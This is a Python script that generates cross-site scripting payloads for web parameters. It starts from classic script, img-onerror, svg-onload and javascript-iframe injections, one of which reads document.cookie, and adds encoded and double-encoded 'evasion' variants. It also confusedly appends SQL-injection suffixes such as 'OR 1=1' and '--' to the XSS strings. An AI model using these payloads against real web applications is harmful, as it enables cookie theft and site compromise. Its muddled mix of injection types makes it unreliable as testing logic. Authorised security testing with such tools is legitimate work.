import urllib.parse
import random

COMP_BASIC = "Basic"
COMP_ADVANCED = "Advanced"
COMP_EVASION = "Evasion"
MAX_PAYLOADS = 60

xss_base = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=confirm(1)>",
    "<svg onload=confirm(1)>"
]

def encode(s):
    return s.replace("'", "%27").replace(" ", "%20").replace("<", "%3C").replace(">", "%3E")

def double_encode(s):
    return encode(encode(s))

def apply_complexity(base, complexity):
    if complexity == COMP_BASIC:
        return base + " /*BASIC*/"
    if complexity == COMP_ADVANCED:
        return base.replace(" ", "/**/") + " /*ADV*/"
    if complexity == COMP_EVASION:
        return encode(base) + " /*EVASION*/"
    return base

def generate_payloads(complexity, target_param="id"):
    payload_set = []
    base = xss_base.copy()
    
    for p in base:
        p_complex = apply_complexity(p, complexity)
        
        # Variations based on the complex payload
        payload_set.append(p_complex)
        payload_set.append(f"{target_param}={p_complex}")
        payload_set.append(p_complex + " OR 1=1")
        payload_set.append(p_complex + " AND 1=1")
        # Ensure we don't have double space issues or similar
        p_no_space = p_complex.replace(" ", "/**/")
        payload_set.append(p_no_space)
        payload_set.append(encode(p_complex))
        payload_set.append(double_encode(p_complex))
        payload_set.append("admin" + p_complex)
        payload_set.append(p_complex + " LIMIT 1")
        payload_set.append(p_complex + " --")
        
        if len(payload_set) >= MAX_PAYLOADS:
            break
            
    return payload_set[:MAX_PAYLOADS]

if __name__ == "__main__":
    for comp in [COMP_BASIC, COMP_ADVANCED, COMP_EVASION]:
        print(f"--- {comp} ---")
        payloads = generate_payloads(comp)
        for i, p in enumerate(payloads):
            print(f"{i+1}: {p}")
